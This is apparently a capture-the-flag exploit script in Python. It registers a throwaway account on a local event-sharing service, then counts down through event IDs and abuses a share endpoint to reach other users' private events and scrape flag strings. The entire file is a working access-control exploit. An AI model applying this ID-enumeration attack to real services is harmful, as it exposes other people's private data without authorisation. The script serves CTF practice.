import random
import string
import requests
import re

URL = "http://localhost:8888"
FLAG_RE = "[A-Z0-9]{31}="

with requests.session() as s:
    gen = lambda: "".join(random.choice(string.ascii_lowercase) for _ in range(8))
    username = gen()
    password = gen()

    resp = s.post(
        URL + "/register",
        data={"username": username, "password": password},
        allow_redirects=False,
    )
    if resp.status_code != 302:
        raise Exception(f"Invalid status code on /register: {resp.status_code}")

    event = {
        "name": "123",
        "start": 123,
        "end": 150,
        "details": "qwe",
        "private": "on",
    }
    r = s.post(URL + "/create", data=event, allow_redirects=False)
    if r.status_code != 302:
        raise Exception(f"Invalid status code on /create: {resp.status_code}")

    redirect = r.headers.get("Location")
    if not redirect:
        raise Exception(f"No Location header in /create")

    try:
        id = int(redirect.split("/")[-2])
    except Exception as e:
        raise Exception(f"Failed to get created event id, got {redirect}")

    flags = []
    while len(flags) < 10:
        id -= 1
        resp = s.post(URL + f"/event/{id}/share", data={"username": username})
        if resp.status_code == 400:
            break

        flags.extend(re.findall(FLAG_RE, resp.text))
    
    print(flags) 
    